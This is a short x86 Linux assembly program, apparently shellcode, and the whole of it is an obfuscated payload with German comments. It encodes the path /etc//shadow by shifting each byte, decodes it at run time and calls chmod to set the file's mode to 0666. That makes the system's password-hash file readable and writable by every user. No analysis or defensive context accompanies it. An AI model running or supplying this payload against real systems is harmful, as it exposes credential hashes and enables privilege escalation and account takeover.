  section .text
 
       global _start
 
  _start:
       xor eax, eax
       xor ecx, ecx
       push eax ;Termination auf /etc/shadow	
       
       mov al,8
        
      mov edi, 0x88807572
      ;mov esi, 0x776f6461 
      push edi

      mov edi, 0x79844040 
      ;mov esi, 0x68732f2f 
      push edi

      mov edi,0x74857640
      ;mov esi, 0x6374652f
      push edi
 
      mov ebx, esp
      mov cl, 12

        ;Subtract 0x11 from every byte from esp to esp+11
      decode:
       sub byte [esp-1+ecx],0x11
      loop decode
             
       mov cx,0xffff
       sub cx,0xfe49
       
       add al,7
       int 0x80
 
       sub al,14
       int 0x80

